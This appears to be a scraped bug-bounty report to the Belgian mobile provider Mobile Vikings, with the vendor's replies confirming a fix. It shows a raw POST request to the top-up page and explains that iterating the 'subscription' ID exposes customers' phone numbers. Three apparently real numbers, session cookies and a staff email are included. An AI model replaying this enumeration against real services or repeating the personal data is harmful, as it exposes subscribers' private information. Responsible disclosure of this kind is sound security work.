title: Enum phone numbers thru /en/sims/topup/add/

profile.name: Mobile Vikings
profile.about: Mobile Vikings is a prepaid provider that lets you connect to your Viking friends for free!

vulnerability_information:
Using request:
POST /en/sims/topup/add/? HTTP/1.1
Host: mobilevikings.be
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:35.0) Gecko/20100101 Firefox/35.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://mobilevikings.be/en/sims/topup/add/
Cookie: mobilevikingsbe=fda79999f5d3ea86aee1cac688306948; csrftoken=AlEqSERKOXKjZfSdw2WtPY4l7n5b68BM; cookies.js=1; _ga=GA1.2.843387348.1423586164; __utmx=177304377.1C02iW_2TT2rFZKjDPjE7Q$0:0; __utmxx=177304377.1C02iW_2TT2rFZKjDPjE7Q$0:1423604553:8035200; __atuvc=5%7C6; _gat=1
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 146

csrfmiddlewaretoken=AlEqSERKOXKjZfSdw2WtPY4l7n5b68BM&subscription=1036392&plan=plan_25_Pkg_50_Dec_2012&vp_amount=&method=bitpay&password_nomethod=

(This request make a page consist sensitive info and this page auto redirect to provider's order page)
It is possible to retrieve all phone numbers in systems iterating subscription parameter. Example:
subscription=1036392 -> +32495121215
subscription=1036390 -> +32475247663
subscription=1036388 -> +32495445503
and so on. The other side of this issue on my mind is that we can force payment process on any valid session with any number as recipient. And tests shown that not all providers show payment details (recipient number on order page). And it is the way to spoof payment process.
vulnerability_information_html:
Using request:
POST /en/sims/topup/add/? HTTP/1.1
Host: mobilevikings.be
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:35.0) Gecko/20100101 Firefox/35.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://mobilevikings.be/en/sims/topup/add/
Cookie: mobilevikingsbe=fda79999f5d3ea86aee1cac688306948; csrftoken=AlEqSERKOXKjZfSdw2WtPY4l7n5b68BM; cookies.js=1; _ga=GA1.2.843387348.1423586164; __utmx=177304377.1C02iW_2TT2rFZKjDPjE7Q$0:0; __utmxx=177304377.1C02iW_2TT2rFZKjDPjE7Q$0:1423604553:8035200; __atuvc=5%7C6; _gat=1
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 146

csrfmiddlewaretoken=AlEqSERKOXKjZfSdw2WtPY4l7n5b68BM&subscription=1036392&plan=plan_25_Pkg_50_Dec_2012&vp_amount=&method=bitpay&password_nomethod=

(This request make a page consist sensitive info and this page auto redirect to provider's order page)
It is possible to retrieve all phone numbers in systems iterating subscription parameter. Example:
subscription=1036392 -> +32495121215
subscription=1036390 -> +32475247663
subscription=1036388 -> +32495445503
and so on. The other side of this issue on my mind is that we can force payment process on any valid session with any number as recipient. And tests shown that not all providers show payment details (recipient number on order page). And it is the way to spoof payment process.

activities.message:
4lemon,

Very, very nice one - great job. I sent this one straight to our team and will update you as soon as I hear from them.
Thank you! By the way: you're looking in a very interesting section, our top-up system! I'd be totally amazed if you'd be able to bypass our top-up/vikingpoint system somehow!

Keep up the good work! 

Inti

4lemon,

Very, very nice one - great job. I sent this one straight to our team and will update you as soon as I hear from them.

activities.message:
Hey @4lemon,

I believe this issue has been fixed. Could you please confirm?

You submitted several rocking reports to us. Even though we do not issue bounties yet, we can send you a (little) present, if you want.
Feel free to drop your address here - or mail me at inti.de.ceukelaire@mobilevikings.com - thanks!

Thanks again for this submission, please continue to send us vulnerability reports!

Inti
activities.markdown_message:
Hey @4lemon,

I believe this issue has been fixed. Could you please confirm?

You submitted several rocking reports to us. Even though we do not issue bounties yet, we can send you a (little) present, if you want.
Feel free to drop your address here - or mail me at inti.de.ceukelaire@mobilevikings.com - thanks!

Thanks again for this submission, please continue to send us vulnerability reports!

Inti

activities.message: confirmed, fixed. Sent e-mail to you,

Thanks @4lemon - got it.

Asked our team to send you a little attention for your work.

Thanks again!
